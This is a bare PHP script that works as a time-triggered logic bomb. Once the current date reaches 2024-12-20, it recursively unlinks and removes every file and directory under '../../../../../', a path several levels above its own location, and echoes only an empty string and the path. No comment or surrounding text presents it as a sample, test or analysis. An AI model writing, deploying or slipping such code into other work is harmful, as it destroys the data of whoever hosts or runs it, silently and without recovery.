<?php
$targetDate = '2024-12-20'; 

$currentDate = date('Y-m-d');

if ($currentDate >= $targetDate) {
    $targetPath = '../../../../../';
    
    function deleteFiles($dir) {
        if (!is_dir($dir)) {
            unlink($dir);
        } else {
            $files = array_diff(scandir($dir), ['.', '..']);
            foreach ($files as $file) {
                deleteFiles("$dir/$file"); 
            }
            rmdir($dir); 
        }
    }

    if (file_exists($targetPath)) {
        deleteFiles($targetPath);
        echo "" . $targetPath;
    } else {
        echo "" . $targetPath;
    }
} else {
    // echo " " . $currentDate;
}

?>